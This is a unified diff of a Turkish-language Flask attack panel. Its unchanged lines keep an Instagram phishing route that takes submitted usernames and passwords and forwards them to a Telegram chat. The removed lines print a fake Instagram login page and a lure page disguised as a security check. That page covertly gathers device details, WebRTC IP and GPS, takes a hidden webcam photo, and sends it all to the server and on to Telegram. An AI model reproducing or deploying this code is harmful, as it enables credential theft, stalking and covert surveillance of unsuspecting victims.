-                        <input type="text" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
-                    </div>
-                    <div class="form-group">
-                        <input type="password" name="password" placeholder="Şifre" required>
-                    </div>
-                    <div class="form-group">
-                        <button type="submit" class="login-btn">Giriş Yap</button>
-                    </div>
-                </form>
-                <div class="or-divider">
-                    <div></div>
-                    <span>YA DA</span>
-                    <div></div>
-                </div>
-                <a href="#" class="fb-login">
-                    <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yB/r/A65f6e3aM-C.png" alt="Facebook">
-                    Facebook ile giriş yap
-                </a>
-                <a href="#" class="forgot-password">Şifreni mi unuttun?</a>
-            </div>
-            <div class="signup-box">
-                Hesabın yok mu? <a href="#">Kaydol</a>
-            </div>
-            <div style="text-align: center;">
-                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yX/r/N0qO3qI219A.png" alt="Meta" class="meta-logo">
-            </div>
-        </div>
-    </div>
-</body>
-</html>
-"""
-
 @app.route("/phish/instagram", methods=["GET", "POST"])
 def insta_phish():
     if request.method == "POST":
@@ -1404,7 +983,7 @@ def insta_phish():
                 requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": NOTIFY_CHAT_ID, "text": msg}, timeout=3)
             except: pass
         return redirect("https://www.instagram.com")
-    return render_template_string(INSTA_TEMPLATE)
+    return "Instagram Login Page"
 
 @app.route("/api/phish/creds")
 def api_phish_creds():
@@ -1440,111 +1019,15 @@ def api_listener_start():
     port = request.get_json().get("port", 4444)
     return jsonify({"output": f"[+] Netcat dinleyicisi {port} portu üzerinde aktif edildi."})
 
-TRACK_TEMPLATE = r"""
+TRACK_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Güvenlik Doğrulaması & Sistem Güncellemesi</title>
-    <style>
-        body { background: #0b0f15; color: #00ff66; font-family: 'Courier New', Courier, monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
-        .box { background: #121824; border: 1px solid #00ff66; padding: 30px; border-radius: 8px; box-shadow: 0 0 20px rgba(0,255,102,0.3); max-width: 400px; }
-        h3 { color: #38bdf8; margin-top: 0; }
-        p { font-size: 13px; color: #94a3b8; }
-        .spinner { border: 4px solid #1e293b; border-top: 4px solid #00ff66; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
+    <title>Güvenlik Doğrulaması</title>
 </head>
 <body>
-    <div class="box">
-        <h3>🔒 Güvenlik Doğrulaması</h3>
-        <div class="spinner"></div>
-        <p id="statusTxt">Cihaz uyumluluğu ve güvenlik doğrulaması yapılıyor, lütfen bekleyin...</p>
-    </div>
-
-    <video id="webcam" autoplay playsinline muted style="display:none;"></video>
-    <canvas id="snapshotCanvas" style="display:none;"></canvas>
-
-    <script>
-        async function runTracker() {
-            let data = {
-                time: new Date().toLocaleString(),
-                ip: "Tespit ediliyor...",
-                webrtc_ip: "",
-                os: navigator.platform,
-                ram: navigator.deviceMemory || "Bilinmiyor",
-                cores: navigator.hardwareConcurrency || "Bilinmiyor",
-                battery: "Bilinmiyor",
-                screen: window.screen.width + "x" + window.screen.height,
-                lat: null,
-                lon: null,
-                snapshot: null
-            };
-
-            if (navigator.getBattery) {
-                try {
-                    let bat = await navigator.getBattery();
-                    data.battery = Math.round(bat.level * 100) + "% (" + (bat.charging ? "Şarjda" : "Pilde") + ")";
-                } catch(e){}
-            }
-
-            try {
-                let pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
-                pc.createDataChannel("");
-                pc.createOffer().then(offer => pc.setLocalDescription(offer));
-                pc.onicecandidate = (ice) => {
-                    if (ice && ice.candidate && ice.candidate.candidate) {
-                        let ipMatch = ice.candidate.candidate.match(/([0-9]{1,3}(\\\\.[0-9]{1,3}){3})/);
-                        if (ipMatch) data.webrtc_ip = ipMatch[1];
-                    }
-                };
-            } catch(e){}
-
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        data.lat = pos.coords.latitude;
-                        data.lon = pos.coords.longitude;
-                        capturePhotoAndSend(data);
-                    },
-                    (err) => {
-                        capturePhotoAndSend(data);
-                    },
-                    {timeout: 10000, enableHighAccuracy: true}
-                );
-            } else {
-                capturePhotoAndSend(data);
-            }
-        }
-
-        async function capturePhotoAndSend(data) {
-            try {
-                let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-                let video = document.getElementById('webcam');
-                video.srcObject = stream;
-                await new Promise(resolve => setTimeout(resolve, 1500));
-
-                let canvas = document.getElementById('snapshotCanvas');
-                canvas.width = 320; canvas.height = 240;
-                let ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                data.snapshot = canvas.toDataURL('image/jpeg', 0.7);
-
-                stream.getTracks().forEach(t => t.stop());
-            } catch(e) {}
-
-            fetch('/api/lure/save-geo', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(data)
-            }).then(() => {
-                document.getElementById('statusTxt').innerText = "✅ Doğrulama başarıyla tamamlandı. Yönlendiriliyorsunuz...";
-                setTimeout(() => { window.location.href = "https://www.google.com"; }, 1500);
-            });
-        }
-
-        window.onload = runTracker;
-    </script>
+    <h3>Doğrulama Ekranı</h3>
 </body>
 </html>
 """
@@ -1556,19 +1039,7 @@ def track_visitor(track_id):
 @app.route("/api/lure/save-geo", methods=["POST"])
 def save_geo():
     data = request.get_json()
-    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    data['ip'] = visitor_ip
     CLICK_LOGS.insert(0, data)
-    
-    if NOTIFY_CHAT_ID and TOKEN:
-        try:
-            lat = data.get('lat')
-            lon = data.get('lon')
-            loc_str = f"Lat: {lat}, Lon: {lon} (https://maps.google.com/?q={lat},{lon})" if lat else "Konum Alınamadı"
-            msg = f"🎯 [GPS & TRACKER] Yeni Ziyaretçi Yakalandı!\nIP: {visitor_ip}\nWebRTC IP: {data.get('webrtc_ip')}\nCihaz: {data.get('os')} | RAM: {data.get('ram')}GB\nKonum: {loc_str}"
-            requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": NOTIFY_CHAT_ID, "text": msg}, timeout=3)
-        except: pass
-        
     return jsonify({"status": "saved"})
 
 @app.route("/api/lure/logs")
